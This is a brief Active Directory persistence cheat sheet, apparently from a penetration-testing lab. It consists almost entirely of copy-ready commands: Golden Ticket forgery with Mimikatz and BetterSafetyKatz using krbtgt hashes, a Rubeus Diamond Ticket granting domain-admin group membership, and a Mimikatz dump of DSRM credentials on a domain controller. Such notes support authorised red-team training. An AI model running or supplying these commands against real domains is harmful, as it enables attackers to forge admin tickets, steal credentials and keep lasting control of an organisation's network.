# Persistence

## Golden Ticket

Execute Golden Ticket Attack using Mimikatz.

```
mimikatz.exe
privilege::debug
kerberos::purge
kerberos::golden /user:domainadmin /domain:test.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

Execute Golden Ticket Attack using BetterSafetyKatz.exe.

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:domainadmin /domain:test.com /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

## Diamond Ticket

Execute Diamond Ticket Attack using Rubeus.

```
C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## DSRM Credentials

Dump DSRM Credentials with using mimikatz.exe (Command must be run on the DC).

```
mimikatz.exe
token::elevate
lsadump::sam
```
